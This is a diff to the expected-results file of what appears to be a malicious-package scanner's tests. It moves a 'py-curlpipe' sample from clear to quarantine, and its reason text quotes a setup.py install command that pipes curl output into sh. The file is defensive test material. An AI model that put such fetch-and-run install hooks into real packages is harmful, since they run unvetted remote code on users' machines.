@@ -7,7 +7,8 @@
       "compositions": [],
       "disposition": "clear",
       "findings": 0,
-      "observations": 1
+      "observations": 1,
+      "source": "oracle"
     },
     "evil-npm": {
       "compositions": [
@@ -18,7 +19,8 @@
       ],
       "disposition": "quarantine",
       "findings": 4,
-      "observations": 7
+      "observations": 7,
+      "source": "oracle"
     },
     "obf-js": {
       "compositions": [
@@ -26,13 +28,19 @@
       ],
       "disposition": "review",
       "findings": 1,
-      "observations": 2
+      "observations": 2,
+      "source": "oracle"
     },
     "py-curlpipe": {
-      "compositions": [],
-      "disposition": "clear",
-      "findings": 0,
-      "observations": 7
+      "compositions": [
+        "BP-DROPPER",
+        "BP-SUPPLY"
+      ],
+      "disposition": "quarantine",
+      "findings": 2,
+      "observations": 8,
+      "reason": "The old engine emits content atoms from hardcoded rules.py, not the pack, so it never saw curl/wget inside a shell string and scored setup.py's os.system('curl URL | sh') as CLEAR \u2014 a false negative on a textbook dropper. The vendored pack's remote-download-cmd rule emits NETW.HTTP for that string, so native composes BP-DROPPER (+ BP-SUPPLY on the install hook). Native is correct.",
+      "source": "native"
     }
   }
 }
